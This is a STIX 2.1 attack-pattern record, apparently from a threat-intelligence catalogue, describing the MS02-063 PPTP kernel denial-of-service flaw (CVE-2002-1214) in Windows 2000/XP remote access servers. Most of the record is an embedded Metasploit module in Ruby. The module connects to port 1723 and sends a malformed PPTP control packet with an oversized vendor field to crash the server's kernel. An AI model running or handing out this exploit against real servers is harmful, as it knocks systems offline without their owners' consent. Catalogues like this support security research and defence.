{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c712301f-68ab-49f5-aff1-81d8a1a9fc75",
    "created": "2024-08-14T16:25:04.166575Z",
    "modified": "2024-08-14T16:25:04.16658Z",
    "name": "MS02-063 PPTP Malformed Control Data Kernel Denial of Service",
    "description": " This module exploits a kernel based overflow when sending abnormal PPTP Control Data packets\tto Microsoft Windows 2000 SP0-3 and XP SP0-1 based PPTP RAS servers (Remote Access Services). Kernel memory is overwritten resulting in a BSOD. Code execution may be possible however this module is only a DoS. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/pptp/ms02_063_pptp_dos.rb",
            "external_id": "ms02_063_pptp_dos.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2002-1214"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'MS02-063 PPTP Malformed Control Data Kernel Denial of Service',\n      'Description'\t=> %q{\n      This module exploits a kernel based overflow when sending abnormal PPTP Control Data\n      packets\tto Microsoft Windows 2000 SP0-3 and XP SP0-1 based PPTP RAS servers\n      (Remote Access Services). Kernel memory is overwritten resulting in a BSOD.\n      Code execution may be possible however this module is only a DoS.\n      },\n      'Author' \t=> [ 'aushack' ],\n      'License'       => MSF_LICENSE,\n      'References'    =>\n      [\n        [ 'BID', '5807' ],\n        [ 'CVE', '2002-1214' ],\n        [ 'OSVDB', '13422' ],\n        [ 'MSB', 'MS02-063' ],\n      ],\n      'DisclosureDate' => '2002-09-26'))\n\n      register_options(\n      [\n        Opt::RPORT(1723),\n      ])\n  end\n\n  def run\n    connect\n\n    # Fields borrowed from Wireshark :)\n    sploit = \"\\x00\\x9c\" # length\n    sploit << \"\\x00\\x01\" # control message\n    sploit << \"\\x1a\\x2b\\x3c\\x4d\" # cookie\n    sploit << \"\\x00\\x01\" # start control connection req\n    sploit << \"\\x00\\x00\" # reserved\n    sploit << \"\\x01\\x00\" # protocol version\n    sploit << \"\\x00\\x00\" # reserved\n    sploit << \"\\x00\\x03\" # framing capabilities\n    sploit << \"\\x00\\x00\\x00\\x02\" # bearer capabilities\n    sploit << \"\\xff\\xff\" # max channels\n    sploit << \"\\x0a\\x28\" # firmware revision\n    sploit << \"\\x00\\x01\" # Hostname\n    sploit << \"A\" * 3000 # Vendor - trigger vuln\n\n    print_status(\"Sending PPTP DoS Packet...\")\n\n    sock.put(sploit)\n\n    print_status(\"Packet sent. Kernel should halt on a Stop Error (BSOD).\")\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2002-09-26"
}